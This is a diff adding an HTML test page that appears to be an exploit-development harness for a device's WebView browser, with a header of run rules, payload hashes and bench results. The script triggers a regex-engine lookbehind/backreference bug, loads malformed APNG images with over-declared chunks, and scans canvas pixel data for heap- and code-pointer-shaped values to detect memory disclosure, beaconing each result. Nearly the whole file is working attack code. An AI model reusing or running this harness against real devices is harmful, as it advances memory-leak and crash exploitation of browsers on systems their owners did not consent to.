@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<!--
+PUBLISHED v674-family kit page (cobrajet302gt bench). Published copy of bench page
+"v674b.html" renamed to match its on-wire beacon prefix P674B. Same naming map as the
+sibling page (desk "V674" | capture lines "v674b" | wire "P674B").
+NOT the artifact behind the 2026-10-29 board capture line: that run was a different
+build (in-page-constructed 69,896 B APNG, PH-* beacon scheme). The APNG payloads here
+are 188-212 B over-declared chunk shapes; running this file verbatim replicates the
+P674B bench runs, not the capture line.
+RUN RULES: serve the payloads/ dir of this kit at /payloads/ with EXACT filenames;
+beacons RELATIVE /beacon/P674B-<TAG>|<msg> (your own host). Grade per load;
+unattributed stream = zero. Battery order: APNGC -> APNGS -> APNGT -> MID; each
+shape emits -STAT then a scan line "nz4= heap= code= other8="; LOADTO at 6500 ms
+only if the JS context is still alive.
+PROOF GRADE [M] 14.10 Guide WebView, bench beacon log, 2026-10-23 x10 + 2026-11-05 x3:
+NON-TERMINATING 13/13 - every load emitted BOOT|v3, YR-CTRL|ok=false, YR-P1|ok=true,
+YR-P2|ok=true, PNGSTART|go, then silence: payload GETs logged 11/13 (apng_ctrl) but
+zero -STAT/-LOAD ERR/LOADTO/scan/DONE beacons ever arrived => the load context dies
+during or beyond the first-shape decode, before any beacon can fire. On 14.22 this is
+a one-cycle differential in either direction: battery completes (cross-FW delta) or
+dies identically (shared delivery-path defect - check your crash module+offset
+entries for the decoder).
+Payload sha256 (must match what you serve):
+  v674_apng_ctrl.png   3ae12de0fc1c8d9d505a3dec55092a1b41dd534f5ca90d5ec7707e3647a90ce0
+  v674_apng_slack.png  fa35612e89c068459779565aa3f99b38346f62cbf8a364f8261d2636f9abe9e0
+  v674_apng_trunc.png  240e1802e063cfb96fa9f0aabc13dc064da62503381fb0967be9984c053ab0a6
+  v674_multiidat.png   f19ca4435709985a26323a244ce9c9de26ebfde7dd671b47181b4197c2c1fdb8
+Code below is byte-identical to the bench artifact; this comment block is the only
+addition.
+-->
+<html><head><meta charset="utf-8"><title>P674B</title></head><body>
+<h3>V674b real-APNG shapes (fdAT over-decl) + C-19 Yarr kill test</h3>
+<script>
+var BK='/beacon/';
+function bk(t,m){ var im=new Image(); im.src=BK+'P674B-'+t+'|'+encodeURIComponent(String(m)).slice(0,140)+'?n='+Math.random(); }
+
+function loadProbe(name, url, cb){
+  var img = new Image(), done=false;
+  function once(ok){ if(done) return; done=true; cb(img, ok); }
+  img.onload = function(){ once(true); };
+  img.onerror = function(){ bk(name+'-LOAD','ERR'); once(false); };
+  setTimeout(function(){ if(!done){ bk(name+'-LOADTO','hang'); once(false); } }, 6500);
+  img.src = '/payloads/' + url + '?n=' + Math.random();
+}
+
+function readRow(img, cb){
+  var W0 = img.width|0, H0 = img.height|0;
+  bk(img._nm+'-STAT', 'dims='+W0+'x'+H0);
+  if(!(W0>0&&H0>0)){ cb(null); return; }
+  var cv = document.createElement('canvas'); cv.width = W0; cv.height = H0;
+  var g = cv.getContext('2d');
+  if(!g){ bk(img._nm+'-CANVAS','no-ctx'); cb(null); return; }
+  g.drawImage(img, 0, 0, W0, H0);
+  var readRows = function(){
+    try{
+      var id = g.getImageData(0, 0, W0, 1);
+      var d = (id && id.data) ? id.data : id;
+      cb(d);
+    }catch(e){ bk(img._nm+'-GID','ERR '+e.name+':'+String(e.message).slice(0,60)); cb(null); }
+  };
+  if(window.requestAnimationFrame) requestAnimationFrame(function(){ setTimeout(readRows,60); });
+  else setTimeout(readRows,300);
+}
+
+function scan(name, d){
+  if(!d){ bk(name,'nodata'); return; }
+  var nz=0, heap=0, code=0, other=0;
+  var n = Math.min(d.length, 65536);
+  for(var i=0;i<n;i+=4){ if(d[i]||d[i+1]||d[i+2]||d[i+3]) nz++; }
+  for(var j=0;j+8<=n;j+=8){
+    var hiU = ((d[j+7]<<24)|(d[j+6]<<16)|(d[j+5]<<8)|d[j+4])>>>0;
+    if(hiU>=0x00000008 && hiU<=0x000000FF) heap++;
+    else if(hiU>=0x00000001 && hiU<=0x00000007) code++;
+    else if(d[j]||d[j+1]||d[j+2]||d[j+3]||d[j+4]||d[j+5]||d[j+6]||d[j+7]) other++;
+  }
+  bk(name,'nz4='+nz+' heap='+heap+' code='+code+' other8='+other);
+}
+
+// PNG/APNG shapes first (they can return junk but must not kill)
+var Q=[
+  ['APNGC','v674_apng_ctrl.png'],
+  ['APNGS','v674_apng_slack.png'],
+  ['APNGT','v674_apng_trunc.png'],
+  ['MID','v674_multiidat.png']
+];
+function step(i){
+  if(i>=Q.length){ bk('DONE','apng+yarr full'); return; }
+  var nm=Q[i][0];
+  loadProbe(nm, Q[i][1], function(img, ok){
+    if(!ok){ step(i+1); return; }
+    img._nm=nm;
+    readRow(img, function(d){ scan(nm, d); step(i+1); });
+  });
+}
+
+// C-19 Yarr {0}-elision: Kickazzman #41 pattern order; 14.10 (WK-1400-gen) predicted CLEAN
+function tryRe(nm, pat){
+  try{ var r=new RegExp(pat); bk('YR-'+nm,'ok='+r.test('ab')); }
+  catch(e){ bk('YR-'+nm,'throw='+e.name); }
+}
+function yarr(){
+  tryRe('CTRL','(?<=\\1(a))b');
+  setTimeout(function(){
+    tryRe('P1','(?<=\\1{0})(a)');
+    setTimeout(function(){
+      tryRe('P2','(?<=\\k<foo>{0})(?<foo>a)');
+      setTimeout(pngs,200);
+    },300);
+  },300);
+}
+function pngs(){ bk('PNGSTART','go'); setTimeout(function(){ step(0); },150); }
+bk('BOOT','v3');
+yarr();
+</script></body></html>
